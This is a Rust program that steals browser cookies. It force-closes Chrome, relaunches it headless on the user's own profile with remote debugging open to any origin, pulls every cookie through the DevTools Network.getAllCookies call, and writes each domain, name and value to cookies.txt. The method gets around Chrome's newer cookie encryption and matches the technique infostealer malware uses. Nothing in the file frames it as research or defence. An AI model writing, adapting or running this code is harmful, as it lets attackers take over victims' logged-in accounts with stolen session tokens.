use std::fs::File;
use std::io::Write;
use serde_json::Value;
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;
use tungstenite::{connect, Message};
use reqwest;
use std::env;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    get_cookie_v20()?;

    Ok(())
}


fn get_cookie_v20() -> Result<(), Box<dyn std::error::Error>> {
    let local_data_path = env::var("LOCALAPPDATA").unwrap_or_default();
    let program_path = env::var("PROGRAMFILES").unwrap_or_default();
    let path_chrome = format!(r"{}\Google\Chrome\Application\chrome.exe", program_path);
    let path_user = format!(r"{}\Google\Chrome\User Data", local_data_path);
    let port_debugging = 9001;

    verify_chrome();

    let _ = Command::new(path_chrome)
            .arg(format!("--remote-debugging-port={}", port_debugging))
            .arg("--remote-allow-origins=*")
            .arg("--headless")
            .arg(format!("--user-data-dir={}", path_user))
            .stdout(Stdio::null()) 
            .stderr(Stdio::null())
            .spawn()?;


    thread::sleep(Duration::from_secs(2));

    match reqwest::blocking::get(format!("http://localhost:{}/json", port_debugging)) {
        Ok(resp) => {
            let json: serde_json::Value = resp.json().unwrap();
            let ws_url = json[0]["webSocketDebuggerUrl"].as_str().unwrap().to_string();

            let (mut socket, _) = connect(ws_url).unwrap();

            let data = serde_json::json!({
                "id": 1,
                "method": "Network.getAllCookies"
            });

            let json_data = serde_json::to_string(&data).unwrap();
            socket.send(Message::Text(json_data.into())).unwrap();
            let mut cookie_file = File::create("cookies.txt")?;

            if let Ok(response) = socket.read() {
                match response {
                    Message::Text(result) => {
                        let v: Value = serde_json::from_str(&result).unwrap();
                        if let Some(cookies) = v["result"]["cookies"].as_array() {
                            for cookie in cookies {
                                writeln!(cookie_file, "domain: {}", cookie["domain"].as_str().unwrap_or(""))?;
                                writeln!(cookie_file, "name: {}", cookie["name"].as_str().unwrap_or(""))?;
                                writeln!(cookie_file, "value: {}\n\n", cookie["value"].as_str().unwrap_or(""))?;
                            }
                        }
                        
                    }
    
                    Message::Close(_) => {
                        writeln!(cookie_file, "Error to get cookies!")?;
                    }
                    _ => {}
                }
            }

        }

        Err(err) => {
            println!("Reqwest Error: {}", err)
        }
    }


    let _ = Command::new("taskkill")
            .arg("/F")
            .arg("/IM")
            .arg("chrome.exe")
            .output()
            .unwrap();


    Ok(())
}



fn verify_chrome() {
    let verify_chrome = Command::new("cmd.exe")
            .arg("/C")
            .arg("tasklist")
            .output()
            .unwrap();

    let result1 = String::from_utf8_lossy(&verify_chrome.stdout);

    if result1.contains("chrome.exe") {
        let _ = Command::new("taskkill")
                .arg("/F")
                .arg("/IM")
                .arg("chrome.exe")
                .output()
                .unwrap();


        thread::sleep(Duration::from_secs(2)); 
    }
}
